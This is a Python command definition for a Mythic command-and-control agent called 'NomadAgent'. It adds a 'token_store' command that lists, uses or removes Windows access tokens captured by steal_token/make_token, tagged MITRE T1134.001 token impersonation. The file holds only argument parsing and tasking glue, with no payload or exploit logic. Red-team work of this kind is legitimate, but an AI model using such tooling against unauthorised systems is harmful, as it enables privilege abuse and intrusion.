from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class TokenStoreArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["list", "use", "remove"],
                default_value="list",
                description="Token store action",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="id",
                type=ParameterType.Number,
                default_value=0,
                description="Token slot ID (for use/remove)",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
        ]

    async def parse_arguments(self):
        if self.command_line and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split()
            if not parts:
                self.add_arg("action", "list")
            else:
                self.add_arg("action", parts[0])
                if len(parts) > 1:
                    self.add_arg("id", int(parts[1]))


class TokenStoreCommand(CommandBase):
    cmd = "token_store"
    needs_admin = False
    help_cmd = "token_store -Action [list|use|remove] [-ID 0]"
    description = "List, use, or remove tokens captured by steal_token/make_token."
    version = 1
    author = "NomadAgent"
    attackmapping = ["T1134.001"]
    argument_class = TokenStoreArguments

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)
        response.DisplayParams = f"{taskData.args.get_arg('action')} {taskData.args.get_arg('id')}"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
